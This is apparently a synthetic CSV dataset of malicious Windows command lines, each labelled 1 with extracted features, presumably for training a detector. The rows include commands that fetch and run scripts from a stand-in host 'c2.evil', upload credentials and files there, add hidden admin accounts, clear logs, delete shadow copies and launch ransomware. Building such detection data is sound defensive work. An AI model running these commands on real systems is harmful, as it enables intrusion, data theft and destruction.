guid,pid,command_line,parent_count,child_process_count,network_connections,dns_queries,files_created,has_invoke,has_download,has_encoded,entropy,first_seen,label
{f27df93c-5f91-6908-bb34-1d7e-73273c60ae1c},8132,"Compress-Archive -Path C:\temp\docs -DestinationPath C:\temp\docs.zip;(New-Object Net.WebClient).UploadFile('http://c2.evil/upload','C:\temp\docs.zip')",1,1,3,3,4,False,True,False,0.272,2025-11-06T08:25:15.186240+00:00Z,1
{741aa26d-8958-6908-abc7-6613-df883d6bff76},8133,powershell -EncodedCommand JABiAHkAdABlAHMAIAA9ACAAWwBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJwBDADoAXAB0AGUAbQBwAFwAZAB1AG0AcAAuAGQAbQBwACcAKQA7ACQAYgA2ADQAIAA9ACAAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACkAOwBJAFcAUgAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBCAG8AZAB5ACAAJABiADYANAA=,1,1,2,2,2,False,False,True,0.141,2025-11-06T08:25:16.186286+00:00Z,1
{f09d07f1-2cd1-6908-aef2-5ee8-cc56c2aabe0c},8134,powershell -EncodedCommand UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAQwA6AFwAdABlAG0AcABcAGwAbwBnAC4AdAB4AHQAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGwAbwBnAC4AdAB4AHQA,1,2,4,1,1,False,False,True,0.183,2025-11-06T08:25:17.186325+00:00Z,1
{440497f9-c505-6908-3ebd-9263-7ee132069ba3},8135,"certutil -encode C:\temp\file.bin C:\temp\file.b64;(New-Object Net.WebClient).UploadString('http://c2.evil/',(gc C:\temp\file.b64 -Raw))",1,6,5,3,2,False,True,True,0.301,2025-11-06T08:25:18.186363+00:00Z,1
{8e96551a-a2fc-6908-5016-6b11-5a39e5715f31},8136,$jeycsl='$creds = Get-Content C:\temp\creds.txt;IWR http://c2.evil/creds -Method POST -Body $creds';IEX $jeycsl,1,6,4,1,2,True,True,False,0.369,2025-11-06T08:25:19.186405+00:00Z,1
{71d87c8f-e7eb-6908-439c-dc25-d03f52ec03ca},8137,powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEIAbwBkAHkAIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkA,1,5,3,1,4,False,False,True,0.191,2025-11-06T08:25:20.186445+00:00Z,1
{20c6270a-9e4d-6908-5f63-a3bb-3d6531e2d719},8138,powershell -EncodedCommand JABlAG4AdgA6AEMATwBNAFAAVQBUAEUAUgBOAEEATQBFACAAKwAgACcAIAAnACAAKwAgACgAdwBoAG8AYQBtAGkAKQAgAHwAIABPAHUAdAAtAEYAaQBsAGUAIABDADoAXAB0AGUAbQBwAFwAaQBkAC4AdAB4AHQAOwBjAGUAcgB0AHUAdABpAGwAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AZgAgAEMAOgBcAHQAZQBtAHAAXABpAGQALgB0AHgAdAAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGkAZAAuAHQAeAB0AA==,1,2,4,1,1,False,False,True,0.15,2025-11-06T08:25:21.186485+00:00Z,1
{a5168cda-f822-6908-7e04-b01c-b4599d88e7a4},8139,IEX (IWR http://c2.evil/ex.ps1);Send-File -Path C:\temp\keys.pfx -Url http://c2.evil/,1,1,2,1,2,True,True,False,0.459,2025-11-06T08:25:22.186522+00:00Z,1
{c827e447-7374-6908-4226-7409-da886c589836},8140,IEX ('Start-Process -FilePath ''+'C:\temp\beacon.exe' -Argu'+'mentList '/stager' -Windo'+'wStyle Hidden'),1,5,5,1,4,True,False,False,0.39,2025-11-06T08:25:23.186563+00:00Z,1
{198af6fd-71cc-6908-5da3-2de5-de96a1592b44},8141,powershell -EncodedCommand cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIAB1AHIAbAAuAGQAbABsACwARgBpAGwAZQBQAHIAbwB0AG8AYwBvAGwASABhAG4AZABsAGUAcgAgAEMAOgBcAHQAZQBtAHAAXABtAGEAbAAuAGQAbwBjAA==,1,2,4,2,2,False,False,True,0.24,2025-11-06T08:25:24.186604+00:00Z,1
{90ea31de-5e46-6908-5b76-b51d-1d4467afdfd7},8142,"$qthziz='mshta javascript:a=GetObject(""script:http://c2.evil/s.hta"").Exec();close()';IEX $qthziz",1,2,4,1,4,True,False,False,0.365,2025-11-06T08:25:25.186644+00:00Z,1
{ab43bd83-754e-6908-9c1a-3e7a-4c0752eef7f2},8143,powershell -EncodedCommand cgBlAGcAcwB2AHIAMwAyACAALwBzACAALwBuACAALwBpADoAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC8AcwAuAHMAYwB0ACAAcwBjAHIAbwBiAGoALgBkAGwAbAA=,1,6,4,1,4,False,False,True,0.252,2025-11-06T08:25:26.186686+00:00Z,1
{113a19a0-2c46-6908-db32-890b-27ad126ff5ed},8144,powershell -EncodedCommand YwBzAGMAcgBpAHAAdAAgAC8ALwBFADoAagBzAGMAcgBpAHAAdAAgAEMAOgBcAHQAZQBtAHAAXABzAGMAcgBpAHAAdAAuAGoAcwA=,1,5,5,3,2,False,False,True,0.283,2025-11-06T08:25:27.186726+00:00Z,1
{03d11260-fe04-6908-3133-459b-4ca116fd7c70},8145,powershell -EncodedCommand dwBzAGMAcgBpAHAAdAAgAEMAOgBcAHQAZQBtAHAAXABzAGMAcgBpAHAAdAAuAHYAYgBzAA==,1,1,4,3,4,False,False,True,0.323,2025-11-06T08:25:28.186767+00:00Z,1
{9f23a1b5-d738-6908-b46f-7976-6a7fef9bb09b},8146,"$ktlion='rundll32.exe javascript:""..\..\mshtml,RunHTMLApplication "";eval(fetch('http://c2.evil/js').text())';IEX $ktlion",1,2,2,0,3,True,False,False,0.367,2025-11-06T08:25:29.186812+00:00Z,1
{c64be810-f8fa-6908-c19b-8b69-90c9fe418620},8147,"IEX ('powershell -c ""Add-Type -'+'AssemblyName System.Windo'+'ws.Forms;[System.Windows.'+'Forms.MessageBox]::Show(''+'Hello')""')",1,3,4,3,4,True,False,False,0.336,2025-11-06T08:25:30.186846+00:00Z,1
{3388cf1b-b1f3-6908-da6f-114a-10e854a3e5ae},8148,"rundll32.exe C:\temp\dllhost.dll,EntryPoint",1,5,4,1,1,False,False,False,0.581,2025-11-06T08:25:31.186889+00:00Z,1
{5bac0279-c2a3-6908-720a-a466-195e34b51e65},8149,IEX ('cmstp.exe /ni /s C:\temp\'+'profile.inf'),1,4,1,1,2,True,False,False,0.553,2025-11-06T08:25:32.186923+00:00Z,1
{c37180d4-c975-6908-b286-903a-7efb6f438da3},8150,powershell -EncodedCommand bQBzAGkAZQB4AGUAYwAgAC8AcQB1AGkAZQB0ACAALwBpACAAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC8AZQB2AGkAbAAuAG0AcwBpAA==,1,5,3,0,4,False,False,True,0.295,2025-11-06T08:25:33.186951+00:00Z,1
{736d8da9-73ec-6908-8a0e-d1e0-08cb438806fe},8151,powershell -EncodedCommand YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcgAgAG0AeQBqAG8AYgAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGUAdgBpAGwALgBlAHgAZQAgAEMAOgBcAHQAZQBtAHAAXABlAHYAaQBsAC4AZQB4AGUA,1,5,5,3,2,False,False,True,0.202,2025-11-06T08:25:34.186987+00:00Z,1
{1989cdb9-50bd-6908-350c-0415-4217720f1c3d},8152,"wmic process call create ""cmd /c C:\temp\evil.bat""",1,3,5,2,2,False,False,False,0.44,2025-11-06T08:25:35.187030+00:00Z,1
{4dec48e4-20d0-6908-4bf8-7267-1bf5910af69d},8153,powershell -EncodedCommand ZgBvAHIAIAAvAEYAIAAlAGkAIABpAG4AIAAoAEMAOgBcAHQAZQBtAHAAXABoAG8AcwB0AHMALgB0AHgAdAApACAAZABvACAAQABjAG8AcAB5ACAAQwA6AFwAdABlAG0AcABcAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAgAFwAXAAlAGkAXABDACQAXAB0AGUAbQBwAFwAcABhAHkAbABvAGEAZAAuAGUAeABlAA==,1,3,4,2,4,False,False,True,0.174,2025-11-06T08:25:36.187069+00:00Z,1
{4c60507b-84cc-6908-a78e-cb08-714c634c842f},8154,$uxpygj='netsh advfirewall set allprofiles state off';IEX $uxpygj,1,4,3,1,2,True,False,False,0.431,2025-11-06T08:25:37.187115+00:00Z,1
{68157607-372f-6908-0995-9a3e-d4d494568b74},8155,powershell -EncodedCommand bgBlAHQAcwBoACAAaQBuAHQAZQByAGYAYQBjAGUAIABzAGUAdAAgAGkAbgB0AGUAcgBmAGEAYwBlACAAIgBFAHQAaABlAHIAbgBlAHQAIgAgAGEAZABtAGkAbgA9AGQAaQBzAGEAYgBsAGUAZAA=,1,6,5,0,2,False,False,True,0.217,2025-11-06T08:25:38.187151+00:00Z,1
{4d564ca1-a317-6908-1dec-4f71-bbb4d5afe4fe},8156,wevtutil cl Security,1,3,3,1,4,False,False,False,0.6,2025-11-06T08:25:39.187186+00:00Z,1
{22e40b50-44d5-6908-a90e-cd73-6e591b993f82},8157,powershell -EncodedCommand dgBzAHMAYQBkAG0AaQBuACAAZABlAGwAZQB0AGUAIABzAGgAYQBkAG8AdwBzACAALwBhAGwAbAAgAC8AcQB1AGkAZQB0AA==,1,6,4,3,1,False,False,True,0.301,2025-11-06T08:25:40.187224+00:00Z,1
{35ea7f1e-280f-6908-5898-762f-575c7cd5babe},8158,$jvgteq='wbadmin delete catalog -quiet';IEX $jvgteq,1,1,5,2,4,True,False,False,0.51,2025-11-06T08:25:41.187263+00:00Z,1
{5f9094ca-e0f2-6908-d3c1-8494-ecd58be5199e},8159,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALgBtAGkAYwByAG8AcwBvAGYAdAAtAGEAawBhAGQAbgBzAC4AYwBvAG0ALwBwAGEAdABjAGgALgBwAHMAMQAnACkAIgA=,1,3,4,0,2,False,False,True,0.15,2025-11-06T08:25:42.187305+00:00Z,1
{b026d60a-c543-6908-c9d4-9041-826ab66db5df},8160,$qiwbep='Invoke-Command -ScriptBlock {Get-ADTrust} -ComputerName dc01.corp.local';IEX $qiwbep,1,1,2,0,2,True,False,False,0.441,2025-11-06T08:25:43.187345+00:00Z,1
{0abe20fe-b17c-6908-d4f4-1999-25dae6184043},8161,"wmic /node:@C:\temp\targets.txt process call create ""powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://c2.evil/stage2.ps1'))""",1,6,3,0,3,True,True,False,0.266,2025-11-06T08:25:44.187375+00:00Z,1
{4128b138-70cc-6908-e8a7-5d13-0afd29de65e6},8162,powershell -EncodedCommand cgBlAGcAIABhAGQAZAAgAEgASwBMAE0AXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABXAGkAbgBSAE0AXABDAGwAaQBlAG4AdAAgAC8AdgAgAEEAbABsAG8AdwBVAG4AZQBuAGMAcgB5AHAAdABlAGQAIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADEAIAAvAGYA,1,2,3,2,4,False,False,True,0.161,2025-11-06T08:25:45.187410+00:00Z,1
{04bdd646-ff89-6908-a943-0603-ede3455dc614},8163,Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force,1,5,4,3,3,False,False,False,0.333,2025-11-06T08:25:46.187450+00:00Z,1
{663cf258-2adc-6908-4894-4484-4d43285cecb9},8164,"$miexoa='powershell -c ""& {Import-Module .\PoshC2.psd1;Invoke-PoshC2 -Server http://c2.evil:80}""';IEX $miexoa",1,5,2,0,2,True,False,False,0.404,2025-11-06T08:25:47.187492+00:00Z,1
{f4366b12-15e2-6908-dce8-c103-aba21374975f},8165,$msekvs='IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/BruteRAT.ps1')';IEX $msekvs,1,1,1,1,1,True,True,False,0.48,2025-11-06T08:25:48.187525+00:00Z,1
{28336002-2adb-6908-5a82-4dbd-5885d42e937c},8166,"IEX ('rundll32.exe C:\temp\load'+'er.dll,ExportFunction')",1,5,5,1,4,True,False,False,0.526,2025-11-06T08:25:49.187553+00:00Z,1
{003eea09-c6ca-6908-5af6-fee3-f5fc86403806},8167,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0ACAAVgBTACAAQwBvAGQAZQBcAEMAbwBkAGUALgBlAHgAZQAnACAALQAtAGEAcgBnAHMAIAAnAC0ALQByAGUAbQBvAHQAZQA9AHMAcwBoAC0AcgBlAG0AbwB0AGUAKwB1AHMAZQByAEAAZQB2AGkAbABoAG8AcwB0ACcAIgA=,1,6,2,1,3,False,False,True,0.137,2025-11-06T08:25:50.187595+00:00Z,1
{2eda833f-9c7c-6908-20bf-1748-538148c95572},8168,powershell -EncodedCommand cgBlAGcAIABhAGQAZAAgAEgASwBDAFUAXABDAG8AbgBzAG8AbABlACAALwB2ACAAVgBpAHIAdAB1AGEAbABUAGUAcgBtAGkAbgBhAGwATABlAHYAZQBsACAALwB0ACAAUgBFAEcAXwBEAFcATwBSAEQAIAAvAGQAIAAxACAALwBmAA==,1,4,5,0,1,False,False,True,0.222,2025-11-06T08:25:51.187631+00:00Z,1
{e00c04a3-d830-6908-d1d4-0ab8-5610bec094b8},8169,"$cescob='powershell -c ""& {Get-ChildItem -Path Cert:\LocalMachine\My | Where {$_.Subject -like '*evil*'}}""';IEX $cescob",1,5,2,2,2,True,False,False,0.395,2025-11-06T08:25:52.189179+00:00Z,1
{b5b46dcd-b5e7-6908-52dc-d5fa-57829dae8912},8170,powershell -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwBhAGIAYwAxADIAMwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA=,1,2,4,3,2,False,False,True,0.257,2025-11-06T08:25:53.189221+00:00Z,1
{7bd0a126-2aa6-6908-ac25-3a64-ce13c49943ce},8171,"powershell -nop -c ""IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((IWR http://c2.evil/b64).Content)))""",1,2,1,0,2,True,True,False,0.341,2025-11-06T08:25:54.189265+00:00Z,1
{9bd89990-32c3-6908-7296-b2db-5fa8e5d06bcf},8172,powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAGMAJwAsACcAJgAnACwAJwB7AEkARQBYACAAKABnAGMAIABDADoAXAB0AGUAbQBwAFwAbwBiAGYALgBwAHMAMQApAH0AJwAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A,1,6,4,3,1,False,False,True,0.173,2025-11-06T08:25:55.189295+00:00Z,1
{85cc2c2d-8865-6908-7ea6-266e-413f9f04fdd0},8173,reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f,1,6,5,2,3,False,False,False,0.346,2025-11-06T08:25:56.189335+00:00Z,1
{deb04c83-303b-6908-46d7-a5b8-688572be5fb8},8174,netsh advfirewall firewall add rule name='Allow RDP' dir=in action=allow protocol=TCP localport=3389,1,6,4,0,4,False,False,False,0.3,2025-11-06T08:25:57.189375+00:00Z,1
{8ffbcc0f-ea21-6908-9d2e-fefd-9186922ba6f1},8175,$pzblqm='Enable-NetFirewallRule -DisplayName 'Remote Desktop - User Mode (TCP-In)'';IEX $pzblqm,1,4,4,1,3,True,False,False,0.411,2025-11-06T08:25:58.189416+00:00Z,1
{072804aa-947c-6908-a1cf-050e-c9fbce635ae0},8176,Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0,1,4,2,3,2,False,False,False,0.322,2025-11-06T08:25:59.189452+00:00Z,1
{d5647056-b796-6908-3570-7160-a8e60a88bdd7},8177,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAHIAZABwAC4AcABzADEAJwApADsARQBuAGEAYgBsAGUALQBSAEQAUAAiAA==,1,4,2,0,2,False,False,True,0.175,2025-11-06T08:26:00.189489+00:00Z,1
{a521f3ae-08d9-6908-b701-c659-31b54af3e1d7},8178,$stkpwp='net localgroup administrators hacker /add';IEX $stkpwp,1,6,5,0,4,True,False,False,0.429,2025-11-06T08:26:01.189525+00:00Z,1
{b01c5226-185f-6908-763b-8af2-975ceb3f4202},8179,powershell -EncodedCommand bgBlAHQAIAB1AHMAZQByACAAaABhAGMAawBlAHIAIABQAGEAcwBzADEAMgAzACEAIAAvAGEAZABkAA==,1,3,3,3,4,False,False,True,0.318,2025-11-06T08:26:02.189564+00:00Z,1
{54efe054-6e50-6908-96fc-e110-0f0dcb0a7314},8180,$ileyep='net user hacker /active:yes';IEX $ileyep,1,3,3,1,4,True,False,False,0.51,2025-11-06T08:26:03.189609+00:00Z,1
{49979fe3-b205-6908-6fb2-3408-01b30e6d62f9},8181,net user hacker /passwordreq:no,1,6,1,3,2,False,False,False,0.581,2025-11-06T08:26:04.189678+00:00Z,1
{ab28efa9-5733-6908-b14b-47a6-33eb5008606f},8182,$tqosii='net localgroup 'Remote Desktop Users' hacker /add';IEX $tqosii,1,3,4,0,1,True,False,False,0.423,2025-11-06T08:26:05.189715+00:00Z,1
{bb74a62b-3969-6908-ec28-3cf8-eb3e92320a95},8183,$hmtqjd='reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /v hacker /t REG_DWORD /d 0 /f';IEX $hmtqjd,1,2,4,0,2,True,False,False,0.349,2025-11-06T08:26:06.189748+00:00Z,1
{117d3f63-5922-6908-f5b7-f34f-04ef3240ab15},8184,"$xzlamn='powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/avkill.ps1');Stop-Defender""';IEX $xzlamn",1,4,1,3,3,True,True,False,0.365,2025-11-06T08:26:07.189786+00:00Z,1
{0cccf76f-36fa-6908-b665-d986-f4ecaf80ccb1},8185,IEX ('wevtutil cl Microsoft-Win'+'dows-PowerShell/Operation'+'al'),1,5,4,1,4,True,False,False,0.485,2025-11-06T08:26:08.189823+00:00Z,1
{b082a958-396d-6908-18b0-ae39-74ac7acd003a},8186,$lzipou='wevtutil cl Security';IEX $lzipou,1,2,5,2,3,True,False,False,0.524,2025-11-06T08:26:09.189868+00:00Z,1
{9534ee94-e046-6908-5765-bdeb-fb05e3cc1771},8187,IEX ('Remove-Item C:\Windows\Sy'+'stem32\Winevt\Logs\* -Rec'+'urse -Force'),1,2,4,3,1,True,False,False,0.467,2025-11-06T08:26:10.189910+00:00Z,1
{877477ad-867f-6908-a84f-32a0-8820ca3761d2},8188,vssadmin delete shadows /all /quiet,1,2,2,1,1,False,False,False,0.486,2025-11-06T08:26:11.189945+00:00Z,1
{93ffd1ea-fbbe-6908-28d9-8cda-0b9ad2316495},8189,IEX ('wbadmin delete systemstat'+'ebackup -quiet'),1,5,5,3,4,True,False,False,0.52,2025-11-06T08:26:12.189974+00:00Z,1
{ab3f631b-63eb-6908-40c9-ca04-3e3abe91dd2a},8190,IEX ('bcdedit /set {default} re'+'coveryenabled No'),1,3,3,1,3,True,False,False,0.538,2025-11-06T08:26:13.190019+00:00Z,1
{b79908b6-15de-6908-911a-a7cd-994222b8952e},8191,IEX ('bcdedit /set {default} bo'+'otstatuspolicy ignoreallf'+'ailures'),1,2,2,3,4,True,False,False,0.394,2025-11-06T08:26:14.190055+00:00Z,1
{f8930a13-2e42-6908-bbc2-9573-2c013f0e3075},8192,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIARwBlAHQALQBWAG8AbAB1AG0AZQAgAHwAIABXAGgAZQByAGUAIAB7ACQAXwAuAEQAcgBpAHYAZQBMAGUAdAB0AGUAcgB9ACAAfAAgAEQAaQBzAGEAYgBsAGUALQBCAGkAdABMAG8AYwBrAGUAcgAiAA==,1,3,5,1,3,False,False,True,0.21,2025-11-06T08:26:15.190093+00:00Z,1
{78b6a293-5d09-6908-e9f3-0e6c-511adaf2571c},8193,manage-bde -off C:,1,3,5,0,4,False,False,False,0.722,2025-11-06T08:26:16.190136+00:00Z,1
{3469b0de-9966-6908-d1b6-87fc-132f1fdb482d},8194,cipher /w:C:\,1,4,4,3,2,False,False,False,0.923,2025-11-06T08:26:17.190173+00:00Z,1
{7ecbca9c-852f-6908-01d7-58ef-8e72dbb2bf95},8195,$puyoob='net stop VSS';IEX $puyoob,1,4,3,3,2,True,False,False,0.559,2025-11-06T08:26:18.190211+00:00Z,1
{c9f12b09-c47a-6908-8abf-11fa-9c3133fe09e7},8196,net stop SDRSVC,1,6,4,2,2,False,False,False,0.8,2025-11-06T08:26:19.190249+00:00Z,1
{e9c3d371-b2be-6908-62d1-d698-0bdff825a8bd},8197,powershell -EncodedCommand bgBlAHQAIABzAHQAbwBwACAAdwBiAGUAbgBnAGkAbgBlAA==,1,6,1,2,1,False,False,True,0.4,2025-11-06T08:26:20.190288+00:00Z,1
{b4437813-330c-6908-6e20-51b1-be12454e1370},8198,"$ldghas='powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/wiper.ps1')""';IEX $ldghas",1,1,2,2,4,True,True,False,0.369,2025-11-06T08:26:21.190317+00:00Z,1
{6828e25c-5ddd-6908-5adb-bf13-5efc24e73747},8199,Start-Process 'C:\temp\ransom.exe' -ArgumentList '/encrypt' -WindowStyle Hidden,1,2,1,0,1,False,False,False,0.405,2025-11-06T08:26:22.190354+00:00Z,1
{08ff7421-aba2-6908-790f-c827-23e122b2e0bd},8200,$fmdkse='IEX (IWR http://c2.evil/ransom -UseBasicParsing)';IEX $fmdkse,1,1,4,3,3,True,True,False,0.543,2025-11-06T08:26:23.190383+00:00Z,1
{73939a80-520b-6908-2fe2-37e3-c2e7d0209116},8201,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAJgAgAHsASQBFAFgAIAAoAGcAYwAgAEMAOgBcAHQAZQBtAHAAXABlAG4AYwByAHkAcAB0AC4AcABzADEAKQB9ACIA,1,3,2,0,1,False,False,True,0.277,2025-11-06T08:26:24.190422+00:00Z,1
{d59065fa-e8d9-6908-837f-9cdf-d06a3eb059ec},8202,$cmoozb='reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f';IEX $cmoozb,1,6,3,1,1,True,False,False,0.35,2025-11-06T08:26:25.190454+00:00Z,1
{bafd2834-8b0e-6908-9c34-e464-c06c2e27c83f},8203,powershell -EncodedCommand bgBlAHQAIAB1AHMAZQAgAFoAOgAgAFwAXABmAGkAbABlAHMAZQByAHYAZQByAFwAcwBoAGEAcgBlACAALwB1AHMAZQByADoAZABvAG0AYQBpAG4AXABhAGQAbQBpAG4AIABQAGEAcwBzADEAMgAzACEA,1,4,1,1,2,False,False,True,0.223,2025-11-06T08:26:26.190487+00:00Z,1
{2249aa0f-b09c-6908-b7da-b396-c3b81ca88afb},8204,IEX ('Copy-Item C:\temp\payload'+'.exe Z:\'),1,6,2,3,4,True,False,False,0.545,2025-11-06T08:26:27.190519+00:00Z,1
{aca9b4d8-40f9-6908-6d83-ed5e-89d986886817},8205,IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/lateral.ps1'),1,4,5,0,1,True,True,False,0.493,2025-11-06T08:26:28.190561+00:00Z,1
{f977de8f-c93c-6908-4176-650f-a6eec9117c27},8206,"IEX ('powershell -c ""Invoke-SMB'+'Exec -Target 192.168.10.5'+'0 -Username admin -Hash a'+'ad3b435b51404eeaad3b435b5'+'1404ee:31d6cfe0d16ae931b7'+'3c59d7e0c089c0""')",1,2,1,1,1,True,False,False,0.301,2025-11-06T08:26:29.190601+00:00Z,1
{be1756ed-0772-6908-b7f3-a85f-010337c200e3},8207,$dwezfs='IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/kerberoast.ps1');Invoke-Kerberoast';IEX $dwezfs,1,5,4,3,2,True,True,False,0.373,2025-11-06T08:26:30.190632+00:00Z,1
{17a3f0be-4df6-6908-785e-4719-fd2baf7da5d4},8208,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAJgAgAHsASQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABTAGgAYQByAHAASABvAHUAbgBkAC4AcABzADEAOwBJAG4AdgBvAGsAZQAtAEIAbABvAG8AZABIAG8AdQBuAGQAIAAtAEMAbwBsAGwAZQBjAHQAaQBvAG4ATQBlAHQAaABvAGQAIABBAGwAbAB9ACIA,1,1,3,3,2,False,False,True,0.184,2025-11-06T08:26:31.190673+00:00Z,1
{d5c4b30a-e42e-6908-2a3b-3136-a2fd15cd3d70},8209,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGEAZAByAGUAYwBvAG4ALgBwAHMAMQAnACkA,1,6,1,1,3,False,False,True,0.203,2025-11-06T08:26:32.190714+00:00Z,1
{b43cdbe2-cf10-6908-dd27-e21b-30e40dbd384d},8210,"$aiypgp='powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/powerview.ps1');Get-NetDomainController""';IEX $aiypgp",1,5,4,1,1,True,True,False,0.317,2025-11-06T08:26:33.190750+00:00Z,1
